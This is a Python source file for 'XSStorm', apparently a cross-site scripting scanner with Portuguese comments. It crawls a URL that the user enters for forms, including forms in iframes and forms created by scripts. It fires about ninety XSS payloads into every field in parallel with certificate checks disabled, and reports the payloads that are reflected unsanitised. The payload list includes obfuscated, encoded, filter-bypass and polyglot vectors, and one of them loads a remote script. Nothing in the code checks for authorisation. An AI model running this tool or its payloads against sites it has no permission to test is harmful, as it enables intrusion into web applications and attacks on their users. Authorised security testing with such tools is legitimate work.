import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import textwrap
import re
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# Desativar avisos SSL (apenas para desenvolvimento/testes!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Códigos de cores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Configuração de exibição
LINE_LENGTH = 80
SECTION_CHAR = "="
SUBSECTION_CHAR = "-"


print("⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⢀⣀⣒⣛⣿⣿⣿⣷⣶⣶⣦⣤⣈⠙⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⠁⠀⠀⣠⣴⣾⣿⣿⣿⣭⣭⣍⣉⣉⡉⠉⠉⠛⠛⠛⠀⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⡄⠀⠁⠀⠀⠀⠀⢀⣉⣉⣛⣛⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠙⢿⣿⣿⣿")
print("⣿⣿⣿⣧⠀⠀⢀⣴⣶⠿⠿⠟⠛⠛⠛⠛⠛⢻⣿⣿⣿⣿⠀⠀⠀⢀⣼⣿⣿⣿")
print("⣿⣿⣿⣿⡆⠀⠋⠉⢀⣤⣴⣶⠾⠿⠿⠿⠿⠿⠿⠿⠿⣏⠀⣴⣾⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⠁⠀⠀⠰⣿⣿⣿⣿⣷⣶⣶⠶⠶⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣶⣤⣀⡀⠙⢿⣿⣿⣿⣷⣶⣶⣶⣶⡶⣶⣤⣄⠀⢻⣿⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⡷⠄⠉⠉⢉⣀⣠⣤⣤⣤⣤⣤⣤⣤⡀⠀⠉⠙⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣧⣤⣤⣄⣀⠙⢿⣿⣿⣿⠿⠿⢿⣟⠛⠇⢠⣴⣶⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠷⠄⠙⠛⠛⠻⠶⠤⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣽⣷⣶⣶⣶⣶⣦⡀⠲⣤⣤⣄⣀⠀⠀⠀⠀⠈⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠘⣿⣿⣿⡿⠀⠀⠀⠀⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠸⣿⡿⠃⣀⣠⣤⣶⣿⣿⣿⣿")
print("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣥⣼⣿⣿⣿⣿⣿⣿⣿⣿")






# Lista de payloads XSS otimizada (mantida igual)
payloads = [
    # Payloads básicos
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<embed src=\"data:text/html,<script>alert(1)</script>\">",

    # Payloads ofuscados
    "<script>eval('al'+'ert(1)')</script>",
    "<a href=\"javas&#99;ript:alert(1)\">XSS</a>",
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<script>window </script>",
    "<script>Object['constructor']('alert(1)')()</script>",
    "<script>/*--><!/*--><!]]>*/alert(1)//--></script>",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
    
    # Payloads avançados
    "<script>Function('ale'+'rt(1)')()</script>",
    "<script>setTimeout('alert(1)',0)</script>",
    "<script>setInterval('alert(1)',1000)</script>",
    "<script>new Function`alert\\`1\\``</script>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data=\"javascript:alert(1)\">",
    
    # Payloads codificados
    "javascript:alert(1)",
    "jav&#x09;ascript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "jav&#x0D;ascript:alert(1)",
    "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",

    # Payloads de eventos HTML
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<img src=x:alert(1)// onerror=eval(src)>",
    "<img src=\"x:alert(1)//\" onerror=eval(src)>",
    "<body onpageshow=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input oninput=alert(1) autofocus>",
    "<form onformdata=alert(1)>",
    
    # Payloads de template
    "${alert(1)}",
    "#{alert(1)}",
    "{{alert(1)}}",
    "<%= alert(1) %>",
    "{{= alert(1) }}",
    
    # Payloads de SVG
    "<svg><script>alert(1)</script>",
    "<svg><script>alert&#40;1&#41</script>",
    "<svg><script>alert&#40;1&#41</script>",
    "<svg><script>javascript:alert(1)</script>",
    "<svg><animate attributeName=\"href\" begin=\"0s\" dur=\"1s\" from=\"x\" to=\"y\" onbegin=\"alert(1)\">",
    "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
    
    # Payloads de marcação
    "<mark onmouseover=alert(1)>Passe o mouse</mark>",
    "<details open ontoggle=alert(1)>",
    "<div onpointerover=alert(1)>Clique aqui</div>",
    "<marquee onstart=alert(1)>",
    "<blink onmouseover=alert(1)>",
    
    # Payloads com caracteres especiais
    "<script>alert(1)//\\</script>",
    "<script src=data:,alert(1)>",
    "<script src=//example.com/xss.js>",
    "<script>/*<script>alert(1)//*/</script>",
    
    # Payloads de redirecionamento
    "<script>location.href='javascript:alert(1)'</script>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
    "<meta http-equiv=\"refresh\" content=\"0;URL=data:text/html,<script>alert(1)</script>\">",
    
    # Payloads para filtros específicos
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    "<img src=\"x\" onerror=alert`1` //",
    "<script>/*</script*/alert(1)//</script>",
    "<scri%00pt>alert(1)</scri%00pt>",
    
    # Payloads para DOM XSS
    "\" onfocus=alert(1) autofocus=\"",
    "' onmouseover=alert(1) style='display:block;width:100%;height:100%'",
    "</script><script>alert(1)</script>",
    "<input id=x onfocus=alert(1) autofocus>",
    "<textarea autofocus onfocus=alert(1)>",
    
    # Payloads para aplicações React/Angular
    "{alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "[{toString:alert,0:1}]",
    "<div ng-app ng-csp><textarea autofocus>{{constructor.constructor('alert(1)')()}}</textarea></div>",
    "{{[].map.constructor('alert(1)')()}}",
    
    # Payloads polyglots (funcionam em múltiplos contextos)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    "\"'-->'</script><script>alert(1)</script>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    
    # Payloads com atributos alternativos
    "<input autofocus onfocus=alert(1)>",
    "<button formaction=\"javascript:alert(1)\">Click</button>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<keygen autofocus onfocus=alert(1)>",
    
    # Quebra de contexto com tags incomuns
    "<math><mi//xlink:href=\"data:x,alert(1)//\">",
    "<xss id=x onmouseover=alert(1)>XSS</xss>",
    "<isindex prompt='><script>alert(1)</script>'>",
    
    # Payloads CSS/IE antigos
    "<div style=\"width: expression(alert(1));\">",
    "<style>@import 'javascript:alert(1)';</style>",
    
    # Prototype pollution / clobbering
    "<input name=__proto__[alert]=1>",
    "<input name=constructor.prototype.alert value=1>",
]


def imprimir_cabecalho(titulo):
    print(f"\n{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{CYAN}{titulo.center(LINE_LENGTH)}{RESET}")
    print(f"{CYAN}{SECTION_CHAR * LINE_LENGTH}{RESET}")

def imprimir_subcabecalho(titulo, color=CYAN):
    print(f"\n{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")
    print(f"{color}{titulo.center(LINE_LENGTH)}{RESET}")
    print(f"{color}{SUBSECTION_CHAR * LINE_LENGTH}{RESET}")

def imprimir_info(mensagem, prefixo=""):
    linhas = textwrap.wrap(mensagem, width=LINE_LENGTH - len(prefixo))
    for linha in linhas:
        print(f"{WHITE}{prefixo}{linha}{RESET}")

def imprimir_sucesso(mensagem):
    print(f"{GREEN}[+] {mensagem}{RESET}")

def imprimir_aviso(mensagem):
    print(f"{YELLOW}[!] {mensagem}{RESET}")

def imprimir_erro(mensagem):
    print(f"{RED}[-] {mensagem}{RESET}")

def imprimir_vulnerabilidade(mensagem):
    print(f"{RED}{mensagem}{RESET}")

def get_page_content(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'Accept': 'text/html,application/xhtml+xml'
        }
        res = requests.get(url, headers=headers, timeout=10, verify=False)
        res.raise_for_status()
        return res.content
    except requests.RequestException as e:
        imprimir_erro(f"Erro ao acessar URL: {e}")
        return None

def encontrar_formularios(url):
    imprimir_cabecalho("PROCURANDO FORMULÁRIOS")
    imprimir_info(f"Analisando URL: {url}")
    
    content = get_page_content(url)
    if not content:
        return []
    
    soup = BeautifulSoup(content, "html.parser")
    
    # Encontrar formulários tradicionais
    forms = soup.find_all("form")
    
    # Encontrar formulários em iframes
    iframes = soup.find_all("iframe")
    for iframe in iframes:
        iframe_src = iframe.get("src")
        if iframe_src:
            iframe_url = urljoin(url, iframe_src)
            iframe_content = get_page_content(iframe_url)
            if iframe_content:
                iframe_soup = BeautifulSoup(iframe_content, "html.parser")
                forms.extend(iframe_soup.find_all("form"))
    
    # Encontrar formulários dinâmicos (JavaScript)
    script_tags = soup.find_all("script")
    js_forms = []
    for script in script_tags:
        if script.string:
            # Padrões comuns de criação dinâmica de formulários
            patterns = [
                r'document\.createElement\(\s*["\']form["\']\s*\)',
                r'\.innerHTML\s*=\s*["\'][^"\']*<form[^>]*>',
                r'\.appendChild\(\s*<\s*form\s*>'
            ]
            for pattern in patterns:
                if re.search(pattern, script.string, re.IGNORECASE):
                    js_forms.append({
                        'type': 'dynamic',
                        'source': 'JavaScript',
                        'code': script.string
                    })
    
    if forms or js_forms:
        imprimir_sucesso(f"Encontrado(s) {len(forms)} formulário(s) HTML e {len(js_forms)} formulário(s) dinâmico(s)")
    else:
        imprimir_aviso("Nenhum formulário encontrado")
    
    return forms + js_forms

def obter_dados_formulario(form):
    if isinstance(form, dict):  # Formulário dinâmico
        return None, 'post', {'dynamic_form': 'JavaScript detected'}
    
    dados = {}
    action = form.get("action", "")
    method = form.get("method", "get").lower()
    
    # Obter todos os campos de entrada possíveis
    inputs = form.find_all(["input", "textarea", "select"])
    for input_tag in inputs:
        name = input_tag.get("name")
        if name:
            value = input_tag.get("value", "")
            if input_tag.name == "select":
                # Para selects, pegar a primeira opção selecionada ou a primeira opção
                selected_option = input_tag.find("option", selected=True)
                if selected_option:
                    value = selected_option.get("value", selected_option.text)
                else:
                    first_option = input_tag.find("option")
                    if first_option:
                        value = first_option.get("value", first_option.text)
            dados[name] = value
            
    return action, method, dados

def verificar_reflexao_contexto(response, payload):
    if not response.text:
        return False
        
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Verificar em tags script
    scripts = soup.find_all('script', string=lambda t: t and payload in str(t))
    if scripts:
        return True
    
    # Verificar manipuladores de eventos
    event_handlers = [
        'onload', 'onerror', 'onclick', 
        'onmouseover', 'onfocus', 'onsubmit',
        'onchange', 'onkeydown', 'onkeypress',
        'onkeyup', 'onmouseout', 'onmouseenter'
    ]
    
    for tag in soup.find_all():
        for attr in tag.attrs:
            if attr.lower() in event_handlers:
                if payload in str(tag[attr]):
                    return True
            if payload in str(tag.get(attr, '')):
                if any(c in str(tag.get(attr, '')) for c in ['<', '>', '"', "'"]):
                    return True
    
    # Verificar em href/javascript
    links = soup.find_all('a', href=lambda x: x and 'javascript:' in x and payload in x)
    if links:
        return True
    
    # Verificar caracteres perigosos não codificados
    if any(c in response.text for c in ['<', '>', '"', "'"]) and payload in response.text:
        return True
        
    return False

def verificar_sanitizacao(response, payload):
    caracteres_perigosos = ['<', '>', '"', "'", '&', '/']
    caracteres_sanitizados = ['&lt;', '&gt;', '&quot;', '&#39;', '&amp;', '&#x2F;']
    
    for i, char in enumerate(caracteres_perigosos):
        if char in payload:
            if char in response.text:
                if caracteres_sanitizados[i] not in response.text:
                    return False
            else:
                return True
                
    return True

def testar_payload(url_destino, method, dados, nome_payload, payload):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (XSS Scanner)',
            'X-Scanner': 'XSS-Detector/1.0',
            'Accept': 'text/html,application/xhtml+xml'
        }
        
        dados_teste = {k: payload for k in dados}
        
        if method == "post":
            res = requests.post(url_destino, data=dados_teste, 
                              headers=headers, timeout=15, verify=False,
                              allow_redirects=False)
        else:
            res = requests.get(url_destino, params=dados_teste,
                             headers=headers, timeout=15, verify=False,
                             allow_redirects=False)
        
        resultado = {
            'payload': payload,
            'nome_payload': nome_payload,
            'url': res.url,
            'status': res.status_code,
            'method': method.upper(),
            'refletido': payload in res.text,
            'contexto': False,
            'sanitizado': False,
            'response_time': res.elapsed.total_seconds()
        }
        
        if resultado['refletido']:
            resultado['sanitizado'] = verificar_sanitizacao(res, payload)
            if not resultado['sanitizado']:
                resultado['contexto'] = verificar_reflexao_contexto(res, payload)
        
        return resultado
        
    except requests.RequestException as e:
        status_code = 500
        if hasattr(e, 'response') and e.response is not None:
            status_code = e.response.status_code
        
        imprimir_erro(f"Erro na requisição para {nome_payload}: {e}")
        return {
            'payload': payload,
            'nome_payload': nome_payload,
            'url': url_destino,
            'status': status_code,
            'method': method.upper(),
            'refletido': False,
            'contexto': False,
            'sanitizado': False,
            'response_time': 0,
            'error': str(e)
        }

def testar_xss(url):
    formularios = encontrar_formularios(url)
    if not formularios:
        return []

    todas_vulnerabilidades = []
    total_payloads = len(formularios) * len(payloads)
    
    # Barra de progresso geral
    with tqdm(total=total_payloads, desc=f"{CYAN}Progresso Geral{RESET}", unit="payload", 
              bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}{postfix}]") as pbar:
    
        for i, form in enumerate(formularios, start=1):
            imprimir_cabecalho(f"TESTANDO FORMULÁRIO {i}/{len(formularios)}")
            
            if isinstance(form, dict):  # Formulário dinâmico
                imprimir_info("Formulário dinâmico detectado via JavaScript")
                action, method, dados = None, 'post', {'dynamic_form': 'JavaScript detected'}
                url_destino = url
            else:
                action, method, dados = obter_dados_formulario(form)
                url_destino = urljoin(url, action) if action else url

            imprimir_info(f"URL do formulário: {url_destino}")
            imprimir_info(f"Método: {method.upper()}")
            imprimir_info(f"Campos: {', '.join(dados.keys()) if dados else 'Nenhum'}")
            
            imprimir_subcabecalho("INICIANDO TESTES XSS", MAGENTA)
            imprimir_info(f"Total de payloads para testar: {len(payloads)}")

            vulnerabilidades = []
            
            # Usando ThreadPoolExecutor para varredura mais rápida
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {
                    executor.submit(
                        testar_payload, 
                        url_destino, 
                        method, 
                        dados, 
                        f"Payload {j+1}", 
                        payload
                    ): (j, payload) 
                    for j, payload in enumerate(payloads)
                }
                
                for future in as_completed(futures):
                    j, payload = futures[future]
                    try:
                        resultado = future.result()
                        if resultado:
                            status_color = GREEN if 200 <= resultado['status'] < 300 else YELLOW if 300 <= resultado['status'] < 400 else RED
                            
                            print(f"\n{BLUE}[Teste {j+1}/{len(payloads)}]{RESET}")
                            print(f"{YELLOW}Payload:{RESET} {payload}")
                            print(f"{WHITE}Status:{RESET} {status_color}{resultado['status']}{RESET}")
                            print(f"{WHITE}Tempo resposta:{RESET} {resultado['response_time']:.2f}s")
                            
                            if resultado.get('error'):
                                print(f"{RED}Erro:{RESET} {resultado['error']}")
                            
                            if resultado['refletido']:
                                if resultado['sanitizado']:
                                    print(f"{GREEN}Payload detectado mas sanitizado{RESET}")
                                elif resultado['contexto']:
                                    msg = "Vulnerabilidade XSS confirmada!"
                                    imprimir_vulnerabilidade(msg)
                                    vulnerabilidades.append(resultado)
                                else:
                                    print(f"{YELLOW}Payload refletido mas sem contexto de execução{RESET}")
                            else:
                                print(f"{GREEN}Nenhuma reflexão detectada{RESET}")
                                
                    except Exception as e:
                        imprimir_erro(f"Erro processando payload {j+1}: {e}")
                    
                    # Atualizar barra de progresso
                    pbar.update(1)
                    pbar.set_postfix(form=f"Form {i}", vulns=len(vulnerabilidades), refresh=True)
            
            if vulnerabilidades:
                imprimir_cabecalho("RELATÓRIO DE VULNERABILIDADES")
                for vuln in vulnerabilidades:
                    print(f"\n{RED}=== Vulnerabilidade XSS ==={RESET}")
                    print(f"{WHITE}Payload: {RED}{vuln['payload']}{RESET}")
                    print(f"{WHITE}Método: {vuln['method']}")
                    print(f"{WHITE}URL: {vuln['url']}")
                    print(f"{WHITE}Status: {vuln['status']}")
                    print(f"{WHITE}Tempo resposta: {vuln['response_time']:.2f}s")
                    
                todas_vulnerabilidades.extend(vulnerabilidades)
    
    return todas_vulnerabilidades

if __name__ == "__main__":
    imprimir_cabecalho("XSStorm")
    url = input(f"{CYAN}Digite a URL para escanear XSS:{RESET} ").strip()
    
    if not url.startswith(('http://', 'https://')):
        url = f"https://{url}"
    
    vulnerabilidades = testar_xss(url)
    
    if vulnerabilidades:
        imprimir_cabecalho("RESUMO DA VERIFICAÇÃO")
        print(f"\n{RED}Encontradas {len(vulnerabilidades)} possíveis vulnerabilidades XSS{RESET}")
        for i, vuln in enumerate(vulnerabilidades, 1):
            print(f"\n{WHITE}{i}. {vuln['payload']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Status: {vuln['status']}")
    else:
        imprimir_sucesso("\nNenhuma vulnerabilidade XSS encontrada")
    
    imprimir_cabecalho("VERIFICAÇÃO CONCLUÍDA")
